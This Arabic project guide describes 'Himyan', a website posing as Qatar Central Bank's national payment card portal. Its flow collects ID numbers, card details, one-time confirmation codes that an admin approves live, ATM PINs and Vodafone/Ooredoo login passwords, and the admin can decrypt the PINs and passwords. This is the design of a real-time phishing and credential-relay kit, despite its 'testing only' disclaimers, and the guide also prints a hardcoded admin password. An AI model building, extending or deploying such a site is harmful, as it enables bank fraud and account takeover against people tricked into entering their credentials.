# 📘 دليل شامل لمشروع Himyan (هميان)

## 📌 ما هو المشروع؟

**مشروع Himyan** هو موقع إلكتروني لبطاقة الدفع الوطنية القطرية "هميان" التابعة لمصرف قطر المركزي.

### الهدف من المشروع:
- عرض معلومات عن بطاقة هميان ومميزاتها
- السماح للمواطنين والمقيمين بتقديم طلبات للحصول على البطاقة
- توفير لوحة إدارة للمشرفين لمتابعة الطلبات

---

## 🌍 اللغات المدعومة

الموقع يدعم **لغتين بالكامل**:
- 🇸🇦 **العربية** (اللغة الافتراضية)
- 🇬🇧 **الإنجليزية**

المستخدم يقدر يبدل بين اللغتين بضغطة زر واحدة.

---

## 💻 التقنيات المستخدمة في المشروع

### 1. Backend (الخادم):
- **Node.js** - بيئة تشغيل JavaScript
- **HTTP Server** - خادم مدمج في Node.js (بدون استخدام Express)
- الخادم بيشتغل على البورت 3000

### 2. قاعدة البيانات:
المشروع عنده **نظامين للتخزين**:
- **PostgreSQL** - قاعدة بيانات احترافية (للاستخدام على Railway)
- **JSON Files** - ملفات نصية (للتجربة المحلية على جهازك)

### 3. Frontend (واجهة المستخدم):
- **HTML5** - هيكل الصفحات
- **CSS3** - التصميم والألوان
- **JavaScript** - البرمجة والتفاعل
- **بدون أي مكتبات خارجية** (Vanilla JavaScript)

### 4. التصميم:
- **Responsive Design** - يشتغل على الموبايل والتابلت والكمبيوتر
- **RTL/LTR Support** - يدعم اتجاه النص من اليمين لليسار والعكس

---

## 📁 تركيبة الملفات والمجلدات

```
📦 Himyan-main/
│
├── 📄 server.js              ← الملف الرئيسي للخادم (البرنامج اللي بيشغل الموقع)
├── 📄 db.js                  ← التعامل مع قاعدة البيانات
├── 📄 package.json           ← معلومات المشروع والتبعيات
├── 📄 .env.example           ← مثال لملف الإعدادات السرية
├── 📄 requests.json          ← ملف تخزين الطلبات محلياً
├── 📄 visitors.json          ← ملف تتبع الزوار
├── 📄 style.css              ← ملف التصميم الرئيسي
├── 📄 README.md              ← ملف التوثيق
│
├── 📁 public/                ← مجلد الملفات العامة
│   ├── index.html            ← الصفحة الرئيسية
│   ├── apply.html            ← صفحة تقديم الطلب
│   ├── confirmation.html     ← صفحة التأكيد
│   ├── confirmation-code.html ← صفحة إدخال رمز التأكيد
│   ├── pending.html          ← شاشة الانتظار
│   ├── admin.html            ← لوحة الإدارة
│   ├── style.css             ← ملف التصميم
│   │
│   └── 📁 assets/            ← الصور والشعارات
│       ├── logo.svg          ← شعار هميان
│       ├── qcb-logo.svg      ← شعار مصرف قطر المركزي
│       ├── card.svg          ← صورة البطاقة الأولى
│       ├── card2.svg         ← صورة البطاقة الثانية
│       │
│       ├── 📁 bank-logos/    ← شعارات البنوك (مبسطة)
│       └── 📁 official-bank-logos/ ← شعارات البنوك (رسمية)
```

---

## 🚶‍♂️ رحلة المستخدم خطوة بخطوة

### 📍 **الخطوة 1: الصفحة الرئيسية**
- المستخدم يفتح الموقع
- يشوف معلومات عن بطاقة هميان
- يقدر يبدل اللغة
- يضغط على زر "تقديم الطلب"

### 📍 **الخطوة 2: نموذج التقديم**
المستخدم يملأ البيانات التالية:
1. **نوع البطاقة**: مسبقة الدفع أو خصم مباشر
2. **البيانات الشخصية**:
   - الاسم الكامل
   - رقم الهوية
   - رقم الجوال (+974)
   - البريد الإلكتروني
   - الجنسية (مواطن/مقيم)
3. **البنك**: اختيار من 17 بنك قطري
4. موافقة على استخدام البيانات

### 📍 **الخطوة 3: صفحة التأكيد**
- يظهر رقم مرجعي للطلب
- واجهة دفع تجريبية (مش حقيقية حالياً)
- بيانات وهمية للبطاقة الائتمانية
- بعد الإرسال → ينتقل لشاشة الانتظار

### 📍 **الخطوة 4: شاشة الانتظار**
- شاشة تحميل مع شعار هميان والبنك
- الموقع بيفحص حالة الطلب تلقائياً كل 5 ثواني
- لما المشرف يوافق → ينتقل تلقائياً للخطوة التالية

### 📍 **الخطوة 5: إدخال رمز التأكيد**
- المستخدم يدخل رمز مكون من 6 أرقام
- الرمز بيتبعت للمشرف للمراجعة
- ينتقل لشاشة انتظار تانية

### 📍 **الخطوة 6: شاشة الانتظار النهائية**
- انتظار موافقة المشرف على الرمز
- بعد الموافقة → الطلب يكتمل

---

## 👨‍💼 لوحة إدارة المشرف

### تسجيل الدخول:
- **اسم المستخدم**: `admin`
- **كلمة المرور**: `HimyanAdmin2026!Qcb#`

⚠️ **مهم جداً**: لازم تغير كلمة المرور دي قبل ما تستخدم الموقع في الحقيقي!

### ماذا يمكن للمشرف أن يفعل؟

1. **عرض إحصائيات**:
   - عدد الزوار النشطين حالياً
   - إجمالي الطلبات
   - عدد الطلبات الجديدة

2. **عرض كل الطلبات** في جدول منظم:
   - التاريخ والوقت
   - اسم المتقدم
   - نوع البطاقة
   - رقم الهوية
   - الجوال والبريد الإلكتروني
   - الجنسية
   - البنك المختار
   - رمز التأكيد (لو أرسله المستخدم)
   - حالة الطلب

3. **إدارة الطلبات**:
   - **قبول** الطلب → المستخدم يقدر يدخل رمز التأكيد
   - **رفض** الطلب → الطلب يتوقف
   - عرض تفاصيل أي طلب بالكامل
   - مراجعة أرقام التأكيد المرسلة

4. **التحديث التلقائي**:
   - لوحة الإدارة بتتحدث تلقائياً كل 10 ثواني
   - فيه زر تحديث يدوي كمان

---

## 📊 حالات الطلب (دورة حياة الطلب)

الطلب بيمر بحالات مختلفة:

```
1. new (جديد)
   ↓
2. pending (بانتظار قرار المشرف)
   ↓
3. approved (مقبول - يحتاج رمز تأكيد)
   ↓
4. code_pending (بانتظار مراجعة الرمز)
   ↓
5. code_approved (الرمز مقبول - اكتمل الطلب) ✅

أو في أي مرحلة ممكن:
   ↓
6. rejected (مرفوض) ❌
7. code_rejected (الرمز مرفوض) ❌
8. handled (تمت المتابعة)
```

---

## 🏦 البنوك المدعومة (17 بنك)

المشروع يدعم البنوك القطرية التالية:

1. بنك قطر الوطني (QNB)
2. البنك التجاري (Commercial Bank)
3. بنك الدوحة (Doha Bank)
4. البنك الأهلي (Ahlibank)
5. مصرف قطر الإسلامي (QIB)
6. مصرف الريان (Masraf Al Rayan)
7. بنك قطر الدولي الإسلامي (QIIB)
8. بنك دخان (Dukhan Bank)
9. بنك لشا (Lesha Bank)
10. بنك قطر للتنمية (QDB)
11. بنك إتش إس بي سي (HSBC)
12. بنك ستاندرد تشارترد (Standard Chartered)
13. البنك العربي (Arab Bank)
14. بنك المشرق (Mashreq Bank)
15. سيتي بنك (Citibank N.A.)
16. بنك بي إن بي باريبا (BNP Paribas)
17. بنك صادرات إيران (Bank Saderat Iran)

كل بنك عنده شعارين:
- **شعار مبسط** (SVG) → يستخدم في التصميم
- **شعار رسمي** (PNG/SVG) → يستخدم في صفحات الدفع

---

## 🔌 واجهات برمجة التطبيقات (APIs)

المشروع عنده 10 واجهات برمجية:

### واجهات عامة (للمستخدمين):

| الرابط | الطريقة | الوظيفة |
|--------|---------|----------|
| `/api/presence` | POST | تحديث حضور الزائر (كل 15 ثانية) |
| `/api/requests` | POST | إرسال طلب جديد |
| `/api/requests/confirm` | POST | تأكيد الطلب بعد بوابة الدفع |
| `/api/requests/status` | GET | الاستعلام عن حالة طلب |
| `/api/requests/code` | POST | إرسال رمز التأكيد |

### واجهات الإدارة (للمشرف فقط):

| الرابط | الطريقة | الوظيفة |
|--------|---------|----------|
| `/api/admin/login` | POST | تسجيل دخول المشرف |
| `/api/admin/logout` | POST | تسجيل خروج |
| `/api/admin/summary` | GET | جلب ملخص الطلبات والزوار |
| `/api/admin/requests` | GET | جلب كل الطلبات |
| `/api/admin/requests` | PATCH | تحديث حالة طلب (قبول/رفض) |

---

## 🗄️ قاعدة البيانات

المشروع بيستخدم **نظامين للتخزين**:

### 1️⃣ PostgreSQL (قاعدة بيانات احترافية):
تستخدم عند رفع المشروع على Railway أو أي سيرفر.

**الجداول**:
- **requests** (الطلبات):
  - معرف فريد (UUID)
  - نوع البطاقة
  - الاسم الكامل
  - رقم الهوية
  - رقم الجوال
  - البريد الإلكتروني
  - الجنسية
  - البنك
  - الحالة
  - رمز التأكيد
  - تواريخ مختلفة

- **visitors** (الزوار):
  - معرف الزائر
  - الصفحة الحالية
  - آخر ظهور

### 2️⃣ JSON Files (ملفات نصية):
تستخدم للتجربة على جهازك المحلي.

**الملفات**:
- `requests.json` - كل الطلبات
- `visitors.json` - الزوار النشطين

**كيف بيشتغل النظامين؟**
- لو فيه رابط قاعدة بيانات PostgreSQL → يستخدمها
- لو مافيش → يستخدم ملفات JSON

---

## 🔐 نظام الأمان

### 1. حماية لوحة الإدارة:
- **Session-based authentication** → جلسة تسجيل دخول
- **HttpOnly Cookies** → مافيش JavaScript يقدر يوصل للكوكيز
- **HMAC Signature** → توقيع رقمي للتحقق من صحة الجلسة
- **مدة الجلسة**: 8 ساعات

### 2. حماية البيانات:
- **Input Sanitization** → تنظيف البيانات المدخلة
- **HTML Escaping** → منع حقن أكواد خبيثة
- **Pattern Validation** → التحقق من صحة الحقول

### 3. حماية الأرقام السرية:
- رمز CVV مابيتبعتش للسيرفر (واجهة تجريبية فقط)
- رقم البطاقة مابيتحفظش في قاعدة البيانات

---

## 🎨 التصميم والألوان

### الألوان الرئيسية:
- **اللون الأساسي**: `#812138` (burgundy - خمري غامق)
- **النص**: `#111` (أسود)
- **الخلفية**: `#fff` (أبيض)

### الخطوط:
- **Cairo** من Google Fonts (يدعم العربي والإنجليزي بشكل ممتاز)

### الاستجابة (Responsive):
الموقع يشتغل على كل الشاشات:
- 📱 **موبايل**: 325px - 720px
- 📱 **تابلت**: 720px - 980px
- 💻 **كمبيوتر**: 980px وأكبر

---

## ⚙️ كيفية تشغيل المشروع

### المتطلبات:
1. **Node.js** نسخة 18 أو أحدث
2. **npm** (يجي مع Node.js)

### خطوات التشغيل:

#### 1️⃣ تثبيت Node.js:
- اذهب إلى: https://nodejs.org
- حمّل النسخة LTS
- ثبّتها على جهازك

#### 2️⃣ فتح المشروع:
```bash
# افتح Command Prompt أو Terminal
cd C:\Users\MEKAW\Downloads\Himyan-main
```

#### 3️⃣ تثبيت التبعيات:
```bash
npm install
```
هذا الأمر بيحمّل مكتبة `pg` (للتعامل مع PostgreSQL)

#### 4️⃣ تشغيل المشروع:
```bash
npm start
```

#### 5️⃣ فتح المتصفح:
اذهب إلى: `http://localhost:3000`

---

## 🌐 رفع المشروع على الإنترنت (Railway)

المشروع جاهز للرفع على **Railway** (منصة استضافة مجانية).

### الخطوات:
1. سجّل حساب على: https://railway.app
2. اضغط **New Project**
3. اختر **Deploy from GitHub**
4. ارفع المشروع على GitHub أولاً
5. اختار المشروع
6. أضف متغيرات البيئة:
   ```
   DATABASE_URL=postgresql://...
   ADMIN_USER=admin
   ADMIN_PASSWORD=كلمة-مرور-قوية
   SESSION_SECRET=سر-عشوائي-طويل
   ```
7. Railway هيشغل المشروع تلقائياً

⚠️ **مهم**: على Railway لازم تستخدم قاعدة بيانات PostgreSQL لأن ملفات JSON مش دائمة!

---

## 📈 الميزات المتقدمة

### 1. تتبع الزوار في الوقت الفعلي:
- كل زائر بيتحدث موقعه كل 15 ثانية
- المشرف يشوف عدد الزوار النشطين حالياً
- الزوار اللي يسيبوا الموقع أكتر من 45 ثانية بينحذفوا تلقائياً

### 2. استطلاع دوري (Polling):
- صفحات الانتظار بتفحص حالة الطلب كل 5 ثواني
- لما المشرف يوافق → تحويل تلقائي للصفحة التالية

### 3. حفظ اللغة المفضلة:
- اللغة اللي يختارها المستخدم بتتحفظ في المتصفح
- لو رجع للموقع تاني بيلاقيها زي ما سابها

### 4. تحديث تلقائي للوحة الإدارة:
- البيانات بتتحدث كل 10 ثواني تلقائياً
- مافيش حاجة للتحديث اليدوي

---

## 🎯 نقاط القوة في المشروع

✅ **كود نظيف ومنظم** - سهل القراءة والتعديل
✅ **دعم كامل للعربية** - كل شيء متوفر بالعربي والإنجليزي
✅ **تصميم احترافي** - يشتغل على كل الأجهزة
✅ **نظام أمان جيد** - حماية أساسية موجودة
✅ **مرونة في التخزين** - PostgreSQL أو JSON حسب الحاجة
✅ **واجهة إدارة سهلة** - المشرف يقدر يتحكم في كل شيء
✅ **دعم 17 بنك** - كل البنوك القطرية الرئيسية

---

## 📞 معلومات مهمة للمطور

### الملفات الأساسية اللي لازم تفهمها:

1. **server.js**:
   - قلب المشروع
   - يحتوي على كل APIs
   - يدير الطلبات والأمان

2. **db.js**:
   - التعامل مع قاعدة البيانات
   - يحول بين PostgreSQL وJSON تلقائياً

3. **index.html**:
   - الصفحة الرئيسية
   - فيها كل الترجمات (translations object)

4. **apply.html**:
   - نموذج التقديم
   - التحقق من البيانات

5. **admin.html**:
   - لوحة الإدارة
   - عرض الطلبات والإحصائيات

### المتغيرات المهمة:

```javascript
// في server.js:
PORT = 3000                    // البورت الافتراضي
ADMIN_USER = 'admin'           // اسم المستخدم
ADMIN_PASSWORD = '...'         // كلمة المرور
SESSION_SECRET = '...'         // سر الجلسات
DATA_DIR = './data'            // مجلد التخزين المحلي
```

---

## 🔄 كيف تعمل الترجمة (i18n)

الترجمة موجودة في كل صفحة HTML في object اسمه `translations`:

```javascript
const translations = {
  ar: {
    title: 'هميان | بطاقة الدفع الوطنية',
    hero: {
      title: 'بطاقة الدفع الوطنية',
      intro: 'هي أول بطاقة...'
    }
  },
  en: {
    title: 'Himyan | National Payment Card',
    hero: {
      title: 'National Payment Card',
      intro: 'The first card...'
    }
  }
};
```

العناصر اللي عليها `data-i18n="hero.title"` بتتحدث تلقائياً لما اللغة تتغير.

---

## 🎓 مصطلحات مهمة

- **Backend**: الجزء اللي بيشتغل على السيرفر (مابيشوفوش المستخدمين)
- **Frontend**: الجزء اللي بيشوفه المستخدم (HTML, CSS, JavaScript)
- **API**: واجهة برمجية للتواصل بين Frontend و Backend
- **Session**: جلسة تسجيل دخول
- **Cookie**: معلومة صغيرة بتتحفظ في المتصفح
- **PostgreSQL**: نوع من قواعد البيانات الاحترافية
- **JSON**: صيغة لحفظ البيانات في ملفات نصية
- **Responsive**: تصميم يتأقلم مع كل الشاشات
- **RTL**: Right-to-Left (من اليمين لليسار)
- **UUID**: معرف فريد لكل طلب

---

## 📚 موارد إضافية

### لو عايز تتعلم أكتر:
- **Node.js**: https://nodejs.org/ar/docs/
- **PostgreSQL**: https://www.postgresql.org/docs/
- **JavaScript**: https://developer.mozilla.org/ar/docs/Web/JavaScript
- **Railway**: https://docs.railway.app

---

## 🏁 الخلاصة

**مشروع Himyan** هو موقع متكامل لتقديم طلبات بطاقة الدفع الوطنية القطرية. المشروع:
- ✅ يشتغل بشكل كامل
- ✅ جاهز للتجربة والعرض
- ⚠️ يحتاج تحسينات قبل الاستخدام الحقيقي (شوف ملف IMPROVEMENTS.md)

**الحالة الحالية**: نموذج أولي (MVP) جاهز للتطوير 🚀



---

## 🆕 التحديث الجديد (الإصدار 2.0.0)

### ⭐ ما الجديد؟

تم إضافة **4 خطوات جديدة** إلى عملية التقديم لجمع معلومات إضافية:

#### 1. صفحة رقم ATM السري (`atm-pin.html`)
- إدخال رقم ATM مكون من 4 أرقام
- تشفير تلقائي باستخدام AES-256-CBC
- دعم الأرقام العربية والإنجليزية

#### 2. صفحة اختيار مزود الشبكة (`network-provider.html`)
- اختيار بين فودافون قطر أو أوريدو قطر
- تصميم بسيط وواضح

#### 3. صفحات تسجيل الدخول
- **vodafone-login.html** - لمستخدمي فودافون
- **ooredoo-login.html** - لمستخدمي أوريدو
- تشفير كلمات المرور قبل الحفظ

### 🔄 التدفق الجديد الكامل

```
الصفحة الرئيسية
    ↓
نموذج التقديم
    ↓
بوابة الدفع التجريبية
    ↓
انتظار موافقة المشرف
    ↓
رمز التأكيد (6 أرقام)
    ↓
🆕 رقم ATM (4 أرقام)
    ↓
🆕 اختيار مزود الشبكة
    ↓
🆕 تسجيل الدخول بحساب المزود
    ↓
اكتمال الطلب
```

### 🔐 نظام التشفير الجديد

**البيانات المُشفرة:**
- رقم ATM PIN (4 أرقام)
- كلمات مرور مزودي الشبكة

**التقنية المستخدمة:**
- **خوارزمية:** AES-256-CBC
- **طول المفتاح:** 256 بت (32 بايت)
- **IV:** 16 بايت عشوائي لكل تشفير

**كيفية العمل:**
```javascript
// التشفير
const encrypted = encrypt("1234"); 
// النتيجة: "a1b2c3d4...iv:encryptedData"

// فك التشفير (Admin فقط)
const decrypted = decrypt(encrypted);
// النتيجة: "1234"
```

### 📊 قاعدة البيانات المحدثة

**6 أعمدة جديدة في جدول `requests`:**

| العمود | النوع | الوصف |
|--------|------|-------|
| `atm_pin_encrypted` | TEXT | رقم ATM مُشفر |
| `network_provider` | VARCHAR(20) | vodafone أو ooredoo |
| `provider_mobile` | VARCHAR(40) | رقم الجوال |
| `provider_password_encrypted` | TEXT | كلمة المرور مُشفرة |
| `steps_completed` | JSONB | الخطوات المكتملة |
| `completed_at` | TIMESTAMPTZ | وقت الإكمال |

### 🔌 APIs الجديدة

#### 1. POST /api/requests/atm-pin
حفظ رقم ATM (مُشفر تلقائياً)

#### 2. POST /api/requests/network-provider
حفظ اختيار مزود الشبكة

#### 3. POST /api/requests/provider-login
حفظ بيانات تسجيل الدخول (مُشفرة)

#### 4. GET /api/requests/decrypt
فك تشفير البيانات الحساسة (Admin فقط)

### 📱 لوحة الأدمن المحدثة

**تحسينات الجدول:**
- عمود جديد: "رقم ATM" مع زر "عرض"
- عمود جديد: "مزود الشبكة"
- حالات جديدة: `atm_pin_submitted`, `provider_selected`, `completed`

**نافذة التفاصيل:**
- عرض جميع البيانات الجديدة
- أزرار فك التشفير للبيانات الحساسة
- وقت إكمال الطلب

### ⚙️ متغيرات البيئة الجديدة

```env
# مفتاح التشفير (ضروري!)
ENCRYPTION_KEY=your_32_byte_hex_key_here

# كلمة مرور Admin المحدثة
ADMIN_PASSWORD=HimyanAdmin2026!Qcb#
```

**إنشاء مفتاح التشفير:**
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

### ⚠️ ملاحظات أمنية مهمة جداً

🔴 **تحذير حرج:** هذا التطبيق **للأغراض التجريبية فقط**

**قبل استخدامه في الإنتاج:**
1. ✅ مراجعة أمنية شاملة من متخصصين
2. ✅ استخدام HSM (Hardware Security Module) لحفظ المفاتيح
3. ✅ التوافق مع معايير PCI DSS
4. ✅ موافقة رسمية من مصرف قطر المركزي
5. ✅ تشفير قاعدة البيانات بالكامل
6. ✅ استخدام HTTPS فقط (SSL/TLS)
7. ✅ تفعيل Audit Logs شاملة
8. ✅ تطبيق 2FA للأدمن

**المخاطر:**
- ❌ تخزين أرقام ATM حتى مع التشفير خطر أمني
- ❌ تخزين كلمات مرور مزودي الشبكة خطر أمني
- ❌ فقدان مفتاح التشفير = فقدان القدرة على فك البيانات
- ❌ الاستخدام الحالي مناسب للتجربة فقط

### 📚 ملفات توثيق جديدة

1. **NEW_FEATURES.md** - دليل شامل للميزات الجديدة
2. **CHANGELOG.md** - سجل التغييرات التفصيلي
3. **QUICK_START.md** - دليل البدء السريع
4. **.kiro/specs/new-application-steps/SPEC.md** - مواصفات التطوير الكاملة

### 🧪 كيفية الاختبار

```bash
# 1. ثبّت المكتبات
npm install

# 2. أنشئ ملف .env
cp .env.example .env

# 3. أضف مفتاح التشفير في .env
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# 4. شغّل السيرفر
npm start

# 5. افتح المتصفح
http://localhost:3000
```

**تدفق الاختبار الكامل:**
1. قدّم طلب من الموقع
2. ادخل للأدمن واقبل الطلب
3. أدخل رمز التأكيد (أي 6 أرقام)
4. أدخل رقم ATM (أي 4 أرقام)
5. اختر مزود الشبكة
6. سجّل الدخول بأي بيانات
7. راجع البيانات في لوحة الأدمن

---

## 📞 للمزيد من المعلومات

- **دليل البدء السريع:** اقرأ `QUICK_START.md`
- **الميزات الجديدة بالتفصيل:** اقرأ `NEW_FEATURES.md`
- **المشاكل والتحسينات:** اقرأ `IMPROVEMENTS_AND_ISSUES.md`
- **سجل التغييرات:** اقرأ `CHANGELOG.md`

---

**تاريخ التحديث:** 2026-08-31  
**الإصدار:** 2.0.0  
**الحالة:** ✅ جاهز للاختبار
